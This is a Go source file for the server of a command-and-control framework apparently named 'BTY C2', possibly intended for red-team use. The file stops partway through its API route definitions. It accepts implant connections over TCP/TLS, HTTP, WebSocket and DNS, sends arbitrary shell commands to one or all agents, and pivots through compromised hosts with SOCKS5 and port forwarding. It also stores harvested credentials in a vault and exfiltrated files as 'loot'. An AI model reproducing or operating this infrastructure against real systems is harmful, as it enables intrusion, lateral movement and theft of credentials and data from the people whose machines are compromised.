package c2

import (
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"bty/src/go/internal/config"
	"bty/src/go/internal/c2/session"
	"bty/src/go/internal/crypto"
	"bty/src/go/internal/db"
	"bty/src/go/internal/proto"
	"bty/src/go/internal/transport"
	"bty/src/go/internal/module"
	"bty/src/go/internal/auth"
	"bty/src/go/internal/reporting"
	"bty/src/go/internal/siem"
	"bty/src/go/internal/logger"
	protobuf "google.golang.org/protobuf/proto"
)

// Server is the main C2 server.
type Server struct {
	cfg       *config.Config
	db        *db.DB
	tlsCert   tls.Certificate
	tlsConfig *tls.Config
	sessions  sync.Map

	// JWT authentication
	tokenManager *auth.TokenManager

	// RBAC
	rbac *auth.RBAC

	// Structured logger
	log *logger.Logger

	// mTLS
	caCert  *x509.Certificate
	caKey   *ecdsa.PrivateKey
	mtlsEnabled bool

	// Multi-transport listeners
	listeners []net.Listener

	// Operational features
	socks5      *SOCKS5Manager
	vault       *CredentialVault
	files       *FileManager
	portFwds    *PortFwdManager
	tunnels     *TunnelManager
	moduleStore *module.Store
	reporter    *reporting.ReportGenerator
	siem        *siem.SIEMForwarder

	// API server for graceful shutdown
	apiServer *http.Server

	quit chan struct{}
	wg   sync.WaitGroup
}

// New creates a new C2 server.
func New(cfg *config.Config, database *db.DB) *Server {
	// Generate a random HMAC key for module verification at startup
	moduleHMACKey := make([]byte, 32)
	rand.Read(moduleHMACKey)

	// Load or create persistent JWT secret
	jwtSecret, err := database.GetSecret("jwt_signing_key")
	if err != nil {
		// Generate new secret and persist it
		jwtSecret = make([]byte, 32)
		rand.Read(jwtSecret)
		database.SetSecret("jwt_signing_key", jwtSecret)
		log.Println("[AUTH] Generated new JWT signing key")
	} else {
		log.Println("[AUTH] Loaded existing JWT signing key")
	}

	// Initialize mTLS CA
	caCert, caKey, err := crypto.GenerateCA()
	mtlsEnabled := false
	if err != nil {
		log.Printf("[MTLS] Warning: failed to generate CA: %v", err)
	} else {
		mtlsEnabled = true
		log.Println("[MTLS] Generated CA certificate for mutual TLS authentication")
	}

	return &Server{
		cfg:          cfg,
		db:           database,
		tokenManager: auth.NewTokenManager(jwtSecret, 12*time.Hour),
		rbac:         auth.NewRBAC(),
		log:          logger.New(logger.INFO, true),
		caCert:       caCert,
		caKey:        caKey,
		mtlsEnabled:  mtlsEnabled,
		socks5:       NewSOCKS5Manager(),
		vault:        NewCredentialVault(database),
		files:        NewFileManager("loot"),
		portFwds:     NewPortFwdManager(),
		tunnels:      NewTunnelManager(),
		moduleStore:  module.NewStore("modules", moduleHMACKey),
		reporter:     reporting.NewReportGenerator("reports"),
		siem:         siem.NewSIEMForwarder(1024),
		apiServer:    nil,
		quit:         make(chan struct{}),
	}
}

// Start begins listening on all configured transports.
func (s *Server) Start() error {
	// Generate TLS cert if needed
	if s.cfg.TLS.Enabled && s.cfg.TLS.AutoCert {
		cert, err := transport.GenerateSelfSignedCert(s.cfg.Server.Host)
		if err != nil {
			return fmt.Errorf("generate TLS cert: %w", err)
		}
		s.tlsCert = cert

		// Use mTLS if CA is available
		if s.mtlsEnabled && s.caCert != nil && s.caKey != nil {
			s.tlsConfig = crypto.NewMTLSServerConfig(cert, s.caCert)
			log.Printf("[MTLS] Mutual TLS enabled — agents require client certificates")
		} else {
			s.tlsConfig = transport.NewTLSConfig(cert)
		}
	}

	// Start REST API
	apiMux := s.setupAPI()
	apiAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.API.Port)
	apiServer := &http.Server{Addr: apiAddr, Handler: apiMux}
	s.apiServer = apiServer

	go func() {
		log.Printf("[API] Listening on %s", apiAddr)
		if err := apiServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("[API] Error: %v", err)
		}
	}()

	// Start TCP/TLS C2 listener
	tcpAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Server.Port)

	var tcpListener net.Listener
	var err error

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		tcpListener, err = tls.Listen("tcp", tcpAddr, s.tlsConfig)
		log.Printf("[TCP+TLS] Listening on %s", tcpAddr)
	} else {
		tcpListener, err = net.Listen("tcp", tcpAddr)
		log.Printf("[TCP] Listening on %s", tcpAddr)
	}

	if err != nil {
		return fmt.Errorf("TCP listen: %w", err)
	}
	s.listeners = append(s.listeners, tcpListener)
	s.wg.Add(1)
	go s.acceptLoop(tcpListener, "tcp")

	// Start HTTPS long-poll listener
	httpAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.HTTPPort)
	var httpListener *transport.HTTPListener

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		httpListener = transport.NewHTTPSListener(httpAddr, s.tlsConfig)
	} else {
		httpListener = transport.NewHTTPListener(httpAddr)
	}

	if err := httpListener.Start(); err != nil {
		log.Printf("[HTTP] Warning: failed to start: %v", err)
	} else {
		s.listeners = append(s.listeners, httpListener)
		s.wg.Add(1)
		go s.acceptLoop(httpListener, "http")
	}

	// Start WebSocket listener
	wsAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.WSPort)
	var wsListener *transport.WSListener

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		wsListener = transport.NewWSSListener(wsAddr, s.tlsConfig)
	} else {
		wsListener = transport.NewWSListener(wsAddr)
	}

	if err := wsListener.Start(); err != nil {
		log.Printf("[WS] Warning: failed to start: %v", err)
	} else {
		s.listeners = append(s.listeners, wsListener)
		s.wg.Add(1)
		go s.acceptLoop(wsListener, "ws")
	}

	// Start DNS listener if configured
	if s.cfg.Transport.DNSPort > 0 {
		dnsAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.DNSPort)
		dnsListener, err := transport.NewDNSListener(dnsAddr, s.cfg.Transport.DNSDomains, nil)
		if err != nil {
			log.Printf("[DNS] Warning: failed to start: %v", err)
		} else {
			dnsListener.Start()
			s.listeners = append(s.listeners, dnsListener)
			s.wg.Add(1)
			go s.acceptLoop(dnsListener, "dns")
		}
	}

	// Session cleanup goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.cleanupStaleSessions()
	}()

	return nil
}

func (s *Server) acceptLoop(listener net.Listener, transportName string) {
	defer s.wg.Done()

	for {
		select {
		case <-s.quit:
			return
		default:
		}

		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-s.quit:
				return
			default:
				continue
			}
		}

		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.handleConnection(conn, transportName)
		}()
	}
}

// Stop gracefully shuts down the server.
func (s *Server) Stop() {
	log.Println("[C2] Shutting down all listeners...")
	close(s.quit)

	// Flush and stop SIEM forwarder
	if s.siem != nil {
		s.siem.Stop()
	}

	// Shutdown API server gracefully
	if s.apiServer != nil {
		s.apiServer.Close()
	}

	// Close all listeners first
	for _, ln := range s.listeners {
		ln.Close()
	}

	// Clean up sessions without ranging while they're being modified
	s.sessions.Range(func(key, value interface{}) bool {
		if sess, ok := value.(*session.Session); ok {
			sess.Close()
		}
		return true
	})

	s.wg.Wait()
	log.Println("[C2] Server stopped")
}

// CreateTask sends a command to an agent.
func (s *Server) CreateTask(agentID, command string, timeoutSec uint32) (*proto.TaskResult, error) {
	var sess *session.Session

	if val, ok := s.sessions.Load(agentID); ok {
		sess = val.(*session.Session)
	} else {
		s.sessions.Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.AgentID == agentID || s.Hostname == agentID || s.ID == agentID {
				sess = s
				return false
			}
			return true
		})
	}

	if sess == nil {
		return nil, fmt.Errorf("agent not found: %s", agentID)
	}
	if !sess.IsActive() {
		return nil, fmt.Errorf("agent not active")
	}

	taskID := generateTaskID()
	task := &proto.Task{TaskId: taskID, Command: command, TimeoutSec: timeoutSec}

	s.db.InsertTask(&db.TaskRecord{
		ID: taskID, SessionID: sess.ID, Command: command, IssuedAt: time.Now(),
	})
	s.db.LogAction(0, "task", fmt.Sprintf("%s: %s", sess.Hostname, command))

	resultCh := sess.RegisterPendingTask(taskID)
	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		sess.ResolveTask(taskID, nil)
		return nil, fmt.Errorf("send: %w", err)
	}

	timeout := time.Duration(timeoutSec) * time.Second
	if timeout == 0 {
		timeout = 30 * time.Second
	}

	select {
	case result := <-resultCh:
		if result != nil {
			s.db.UpdateTaskResult(taskID, result.Output, int(result.ExitCode), result.Success)
		}
		return result, nil
	case <-time.After(timeout):
		sess.ResolveTask(taskID, nil)
		s.db.UpdateTaskResult(taskID, "timeout", -1, false)
		return nil, fmt.Errorf("task timed out")
	}
}

// BroadcastTask sends a command to all active sessions.
func (s *Server) BroadcastTask(command string) map[string]*proto.TaskResult {
	results := make(map[string]*proto.TaskResult)
	var mu sync.Mutex
	var wg sync.WaitGroup

	s.sessions.Range(func(key, value interface{}) bool {
		sess := value.(*session.Session)
		if !sess.IsActive() {
			return true
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			result, err := s.CreateTask(sess.ID, command, 30)
			mu.Lock()
			if err != nil {
				results[sess.ID] = &proto.TaskResult{TaskId: sess.ID, Success: false, ErrorMessage: err.Error()}
			} else {
				results[sess.ID] = result
			}
			mu.Unlock()
		}()
		return true
	})

	wg.Wait()
	return results
}

// ActiveSessions returns the count of active sessions.
func (s *Server) ActiveSessions() int {
	count := 0
	s.sessions.Range(func(key, value interface{}) bool {
		if value.(*session.Session).IsActive() {
			count++
		}
		return true
	})
	return count
}

// KillAgent kills a specific agent session.
func (s *Server) KillAgent(agentID string) error {
	val, ok := s.sessions.Load(agentID)
	if !ok {
		return fmt.Errorf("agent not found")
	}
	sess := val.(*session.Session)
	sess.SetState(session.StateKilled)
	sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT, nil)
	sess.Close()
	s.db.UpdateSessionState(sess.ID, "killed")

	s.siem.Forward(siem.SIEMEvent{
		EventType: "agent_killed",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
		},
	})

	return nil
}

// --- Connection handler ---

func (s *Server) handleConnection(conn net.Conn, transportName string) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()

	// Read first 4 bytes to validate protocol (length-prefixed message)
	peek := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, err := conn.Read(peek)
	conn.SetReadDeadline(time.Time{})

	// Reject non-BTY protocol connections (browsers, scanners, TLS handshakes)
	if err != nil || n < 4 || peek[0] == 0x16 || peek[0] == 0x47 || peek[0] == 0x50 {
		if peek[0] == 0x16 {
			// TLS ClientHello — silently drop
			return
		}
		return
	}

	// Validate length prefix is reasonable (1 byte to 100 MB)
	msgLen := binary.BigEndian.Uint32(peek)
	if msgLen < 10 || msgLen > 100*1024*1024 {
		return
	}

	// Prepend peek bytes back for the session reader
	conn = &peekConn{Conn: conn, peek: peek[:n]}

	log.Printf("[C2/%s] New connection from %s", transportName, remoteAddr)

	sess := session.NewSession(conn, transportName)
	sess.SetState(session.StateKeyExchange)

	if err := s.handleKeyExchange(sess); err != nil {
		log.Printf("[C2/%s] Key exchange failed: %v", transportName, err)
		return
	}

	if err := s.handleSessionInit(sess); err != nil {
		log.Printf("[C2/%s] Session init failed: %v", transportName, err)
		return
	}

	log.Printf("[C2/%s] Session established: %s (%s@%s)",
		transportName, sess.ID, sess.Username, sess.Hostname)

	s.db.UpsertSession(&db.SessionRecord{
		ID: sess.ID, AgentID: sess.AgentID, Hostname: sess.Hostname,
		OS: sess.OS, Arch: sess.Arch, Username: sess.Username,
		IsAdmin: sess.IsAdmin, State: "active", LastSeen: time.Now(),
	})
	s.db.LogAction(0, "session", fmt.Sprintf("%s via %s", sess.Hostname, transportName))

	// Forward session establishment to SIEM
	s.siem.Forward(siem.SIEMEvent{
		EventType: "session_established",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
			"os":         sess.OS,
			"arch":       sess.Arch,
			"username":   sess.Username,
			"is_admin":   sess.IsAdmin,
			"transport":  transportName,
		},
	})

	s.sessions.Store(sess.ID, sess)
	sess.SetState(session.StateActive)

	s.handleMessageLoop(sess)

	s.db.UpdateSessionState(sess.ID, "disconnected")
	log.Printf("[C2/%s] Session ended: %s", transportName, sess.ID)
}

func (s *Server) handleKeyExchange(sess *session.Session) error {
	serverKP, err := crypto.GenerateKeyPair()
	if err != nil {
		return fmt.Errorf("keypair: %w", err)
	}
	sess.KeyPair = serverKP

	inner, err := sess.RecvRaw()
	if err != nil {
		return fmt.Errorf("recv: %w", err)
	}

	if inner.Type != proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE {
		return fmt.Errorf("expected KEY_EXCHANGE")
	}

	agentKE := inner.GetKeyExchange()
	if len(agentKE.PublicKey) != crypto.KeySize {
		return fmt.Errorf("invalid key size")
	}

	var agentPub [crypto.KeySize]byte
	copy(agentPub[:], agentKE.PublicKey)

	shared, err := crypto.DeriveSharedSecret(&serverKP.PrivateKey, &agentPub)
	if err != nil {
		return fmt.Errorf("shared secret: %w", err)
	}

	salt, _ := crypto.GenerateSalt()
	encKey, hmacKey, sessionToken, err := crypto.DeriveSessionKeys(shared, salt)
	if err != nil {
		return fmt.Errorf("derive keys: %w", err)
	}

	sess.EncKey = encKey
	sess.HmacKey = hmacKey
	sess.SessionToken = sessionToken

	serverInner := &proto.EnvelopeInner{
		Id:        2,
		Type:      proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp: uint64(time.Now().UnixNano()),
		Payload:   &proto.EnvelopeInner_KeyExchange{KeyExchange: &proto.KeyExchange{
			PublicKey: serverKP.PublicKey[:], Padding: salt,
		}},
	}
	innerBytes, _ := protobuf.Marshal(serverInner)

	return sess.SendRaw(&proto.Envelope{
		Id: 2, Type: proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp:  serverInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	})
}

func (s *Server) handleSessionInit(sess *session.Session) error {
	inner, err := sess.RecvRaw()
	if err != nil {
		return fmt.Errorf("recv: %w", err)
	}

	if inner.Type != proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT {
		return fmt.Errorf("expected SESSION_INIT")
	}

	init := inner.GetSessionInit()
	sess.Hostname = init.Hostname
	sess.OS = init.Os
	sess.Arch = init.Arch
	sess.Username = init.Username
	sess.IsAdmin = init.IsAdmin
	sess.AgentID = init.AgentId
	sess.AgentVersion = init.AgentVersion

	ack := &proto.Acknowledge{AckId: inner.Id, Success: true}
	return sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_ACK, ack)
}

func (s *Server) handleMessageLoop(sess *session.Session) {
	for {
		select {
		case <-s.quit:
			return
		default:
		}

		inner, err := sess.RecvEnvelope()
		if err != nil {
			log.Printf("[C2] Session %s read error: %v", sess.ID, err)
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_error",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID, "error": err.Error()},
			})
			sess.Close()
			return
		}

		switch inner.Type {
		case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
			sess.Touch()
			s.db.UpdateSessionLastSeen(sess.ID)

		case proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT:
			if result := inner.GetTaskResult(); result != nil {
				// Check for tunnel results
				if strings.HasPrefix(result.Output, "tunnel_") {
					s.tunnels.HandleTunnelResult(result)
				}
				sess.ResolveTask(result.TaskId, result)

				// Forward task result to SIEM
				s.siem.Forward(siem.SIEMEvent{
					EventType: "task_result",
					Source:    "c2_server",
					Data: map[string]interface{}{
						"session_id": sess.ID,
						"task_id":    result.TaskId,
						"success":    result.Success,
						"exit_code":  result.ExitCode,
					},
				})
			}

		case proto.EnvelopeType_ENVELOPE_TYPE_RECONNECT:
			sess.SetState(session.StatePassive)
			s.db.UpdateSessionState(sess.ID, "passive")
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_passive",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID},
			})

		case proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT:
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_disconnect",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID},
			})
			sess.Close()
			return
		}
	}
}

func (s *Server) cleanupStaleSessions() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-s.quit:
			return
		case <-ticker.C:
			s.sessions.Range(func(key, value interface{}) bool {
				sess := value.(*session.Session)
				if sess.IsStale(s.cfg.Server.SessionTimeout) {
					sess.Close()
				}
				return true
			})
		}
	}
}

// --- REST API ---

func (s *Server) setupAPI() *http.ServeMux {
	mux := http.NewServeMux()

	// Rate limiter: 60 requests per minute per IP
	rateLimiter := NewRateLimiter(60, time.Minute)

	// Start periodic cleanup of stale rate limiter entries
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-s.quit:
				return
			case <-ticker.C:
				rateLimiter.Cleanup()
			}
		}
	}()

	cors := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "0")
			w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
			w.Header().Set("Content-Security-Policy", "default-src 'self'")
			r.Body = http.MaxBytesReader(w, r.Body, 1024*1024)
			origin := r.Header.Get("Origin")
			if origin != "" {
				allowedOrigins := []string{
					"http://localhost:9090",
					"http://127.0.0.1:9090",
					"http://localhost:5173",
				}
				allowed := false
				for _, ao := range allowedOrigins {
					if origin == ao {
						w.Header().Set("Access-Control-Allow-Origin", origin)
						allowed = true
						break
					}
				}
				if !allowed {
					w.Header().Set("Access-Control-Allow-Origin", "")
				}
			}
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
			if r.Method == "OPTIONS" {
				w.WriteHeader(200)
				return
			}
			next(w, r)
		}
	}

	authMiddleware := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			authHeader := r.Header.Get("Authorization")
			if authHeader == "" {
				w.Header().Set("WWW-Authenticate", `Bearer realm="BTY C2"`)
				http.Error(w, `{"error":"missing token"}`, 401)
				return
			}

			if !strings.HasPrefix(authHeader, "Bearer ") {
				http.Error(w, `{"error":"invalid auth scheme"}`, 401)
				return
			}

			token := strings.TrimPrefix(authHeader, "Bearer ")
			username, role, err := s.tokenManager.ValidateToken(token)
			if err != nil {
				s.db.LogAction(0, "auth_failed", fmt.Sprintf("%s: %s", r.RemoteAddr, err))
				http.Error(w, `{"error":"invalid or expired token"}`, 401)
				return
			}

			// Attach user info to request context
			r.Header.Set("X-Auth-User", username)
			r.Header.Set("X-Auth-Role", role)
			next(w, r)
		}
	}

	// RBAC middleware - checks if user's role has the required permission
	requirePermission := func(permission string) func(http.HandlerFunc) http.HandlerFunc {
		return func(next http.HandlerFunc) http.HandlerFunc {
			return func(w http.ResponseWriter, r *http.Request) {
				role := r.Header.Get("X-Auth-Role")
				if role == "" {
					http.Error(w, `{"error":"authentication required"}`, 401)
					return
				}

				if !s.rbac.HasPermission(role, permission) {
					s.db.LogAction(0, "auth_denied", fmt.Sprintf("%s %s by %s (%s) - missing permission: %s",
						r.Method, r.URL.Path, r.Header.Get("X-Auth-User"), role, permission))
					http.Error(w, `{"error":"insufficient permissions"}`, 403)
					return
				}
				next(w, r)
			}
		}
	}

	adminOnly := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			role := r.Header.Get("X-Auth-Role")
			if role != "admin" {
				http.Error(w, `{"error":"admin access required"}`, 403)
				return
			}
			next(w, r)
		}
	}

	auditWithLogging := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			ip, _, _ := net.SplitHostPort(r.RemoteAddr)
			if ip == "" {
				ip = r.RemoteAddr
			}
			user := r.Header.Get("X-Auth-User")
			if user == "" {
				user = "anonymous"
			}
			s.db.LogAction(0, "api_call", fmt.Sprintf("%s %s from %s by %s", r.Method, r.URL.Path, ip, user))
			next(w, r)
		}
	}

	// Login endpoint (no auth required)
	mux.HandleFunc("/api/login", cors(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", 405)
			return
		}

		var req struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}

		operator, err := s.db.AuthenticateOperator(req.Username, req.Password)
		if err != nil {
			s.db.LogAction(0, "auth_failed", r.RemoteAddr)
			http.Error(w, `{"error":"invalid credentials"}`, 401)
			return
		}

		token, err := s.tokenManager.GenerateToken(operator.Username, operator.Role)
		if err != nil {
			http.Error(w, `{"error":"token generation failed"}`, 500)
			return
		}

		refreshToken, err := s.tokenManager.GenerateRefreshToken(operator.Username)
		if err != nil {
			http.Error(w, `{"error":"refresh token generation failed"}`, 500)
			return
		}

		s.db.LogAction(0, "auth_success", fmt.Sprintf("%s logged in", operator.Username))

		s.siem.Forward(siem.SIEMEvent{
			EventType: "operator_login",
			Source:    "c2_server",
			Data: map[string]interface{}{
				"username": operator.Username,
				"role":     operator.Role,
				"remote":   r.RemoteAddr,
			},
		})

		json.NewEncoder(w).Encode(map[string]interface{}{
			"token":         token,
			"refresh_token": refreshToken,
			"expires_in":    43200, // 12 hours
			"user":          operator.Username,
			"role":          operator.Role,
		})
	}))))

	// Refresh token endpoint
	mux.HandleFunc("/api/refresh", cors(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "method not allowed", 405)
			return
		}

		var req struct {
			RefreshToken string `json:"refresh_token"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}

		username, role, err := s.tokenManager.ValidateToken(req.RefreshToken)
		if err != nil || role != "refresh" {
			http.Error(w, `{"error":"invalid refresh token"}`, 401)
			return
		}

		// Get operator role from database
		operators, err := s.db.ListOperators()
		if err != nil {
			http.Error(w, `{"error":"database error"}`, 500)
			return
		}

		operatorRole := "operator"
		for _, op := range operators {
			if op["username"] == username {
				operatorRole = op["role"].(string)
				break
			}
		}

		newToken, err := s.tokenManager.GenerateToken(username, operatorRole)
		if err != nil {
			http.Error(w, `{"error":"token generation failed"}`, 500)
			return
		}

		json.NewEncoder(w).Encode(map[string]interface{}{
			"token":      newToken,
			"expires_in": 43200,
		})
	}))))

	mux.HandleFunc("/api/health", cors(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode(map[string]interface{}{
			"status":          "ok",
			"active_sessions": s.ActiveSessions(),
			"listeners":       len(s.listeners),
			"uptime":          time.Now().Unix(),
		})
	}))))

	mux.HandleFunc("/api/sessions", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(requirePermission(auth.PermSessionsList)(func(w http.ResponseWriter, r *http.Request) {
		sessions, _ := s.db.ListActiveSessions()
		if sessions == nil {
			sessions = []db.SessionRecord{}
		}
		json.NewEncoder(w).Encode(sessions)
	}))))))

	mux.HandleFunc("/api/sessions/", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		id := r.URL.Path[len("/api/sessions/"):]
		if r.Method == "DELETE" {
			if err := s.KillAgent(id); err != nil {
				http.Error(w, err.Error(), 404)
				return
			}
			json.NewEncoder(w).Encode(map[string]string{"status": "killed"})
			return
		}
		tasks, _ := s.db.GetSessionTasks(id)
		sess, _ := s.db.GetSession(id)
		json.NewEncoder(w).Encode(map[string]interface{}{"session": sess, "tasks": tasks})
	})))))

	mux.HandleFunc("/api/cmd", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(requirePermission(auth.PermCommandsExecute)(func(w http.ResponseWriter, r *http.Request) {
		validated, ok := ValidateCommandRequest(w, r)
		if !ok {
			return
		}
		result, err := s.CreateTask(validated.AgentID, validated.Command, validated.Timeout)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(result)
	}))))))

	mux.HandleFunc("/api/broadcast", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(requirePermission(auth.PermCommandsBroadcast)(func(w http.ResponseWriter, r *http.Request) {
		command, ok := ValidateBroadcastRequest(w, r)
		if !ok {
			return
		}
		results := s.BroadcastTask(command)
		json.NewEncoder(w).Encode(results)
	}))))))

	// SOCKS5 proxy management
	mux.HandleFunc("/api/socks", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "GET" {
			json.NewEncoder(w).Encode(s.socks5.ListProxies())
			return
		}
		var req struct {
			SessionID string `json:"session_id"`
			Port      int    `json:"port"`
		}
		json.NewDecoder(r.Body).Decode(&req)
		if r.Method == "DELETE" {
			s.socks5.StopProxy(req.SessionID)
			json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
			return
		}

		if req.SessionID == "" {
			s.sessions.Range(func(k, v interface{}) bool {
				s := v.(*session.Session)
				if s.IsActive() {
					req.SessionID = s.ID
					return false
				}
				return true
			})
		}

		dialFn := func(target string) (net.Conn, error) {
			var sess *session.Session
			s.sessions.Range(func(k, v interface{}) bool {
				s := v.(*session.Session)
				if s.IsActive() && (s.AgentID == req.SessionID || s.ID == req.SessionID || s.Hostname == req.SessionID) {
					sess = s
					return false
				}
				return true
			})
			if sess == nil {
				return nil, fmt.Errorf("session not found")
			}
			return s.tunnels.OpenTunnel(sess, target)
		}

		addr, err := s.socks5.StartProxy(req.SessionID, req.Port, dialFn)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{"address": addr, "status": "started"})
	})))))

	// Credential vault
	mux.HandleFunc("/api/vault", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var c Credential
			json.NewDecoder(r.Body).Decode(&c)
			id := s.vault.Add(c)
			json.NewEncoder(w).Encode(map[string]string{"id": id, "status": "stored"})
			return
		}
		query := r.URL.Query().Get("q")
		if query != "" {
			json.NewEncoder(w).Encode(s.vault.Search(query))
		} else {
			json.NewEncoder(w).Encode(s.vault.List())
		}
	})))))

	// Exfiltrated files
	mux.HandleFunc("/api/files", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var req struct {
				SessionID string `json:"session_id"`
				Filename  string `json:"filename"`
				Module    string `json:"module"`
				Data      string `json:"data"`
			}
			json.NewDecoder(r.Body).Decode(&req)
			rec, err := s.files.Store(req.SessionID, req.Filename, req.Module, []byte(req.Data))
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			json.NewEncoder(w).Encode(rec)
			return
		}
		json.NewEncoder(w).Encode(s.files.List())
	})))))

	// File download
	mux.HandleFunc("/api/files/download/", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		id := r.URL.Path[len("/api/files/download/"):]
		data, rec, err := s.files.Read(id)
		if err != nil {
			http.Error(w, err.Error(), 404)
			return
		}
		w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, rec.Filename))
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(data)
	})))))

	// Port forwarding
	mux.HandleFunc("/api/portfwd", cors(authMiddleware(auditWithLogging(RateLimitMiddleware(rateLimiter)(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "GET" {
			json.NewEncoder(w).Encode(s.portFwds.List())
			return
		}
		if r.Method == "DELETE" {
			id := r.URL.Query().Get("id")
			if err := s.portFwds.Stop(id); err != nil {
				http.Error(w, err.Error(), 404)
				return
			}
			json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
			return
		}
		var req struct {
			SessionID  string `json:"session_id"`
			LocalPort  int    `json:"local_port"`
			RemoteHost string `json:"remote_host"`
			RemotePort int    `json:"remote_port"`
		}
		json.NewDecoder(r.Body).Decode(&req)

		dialFn := func(target string) (net.Conn, error) {
			var sess *session.Session
			s.sessions.Range(func(k, v interface{}) bool {
				s := v.(*session.Session)
				if s.AgentID == req.SessionID || s.ID == req.SessionID {
					sess = s
					return false
				}
				return true
			})
			if sess == nil {
				return nil, fmt.Errorf("session not found")
			}
			return s.tunnels.OpenTunnel(sess, target)
		}

		fwd, err := s.portFwds.Start(req.SessionID, req.LocalPort, req.RemoteHost, req.RemotePort, dialFn)
		if err != nil {
			http.Error(w, err.Error(), 500)
			return
		}
		json.NewEncoder(w).Encode(fwd)
	})))))

	// Dynamic modules
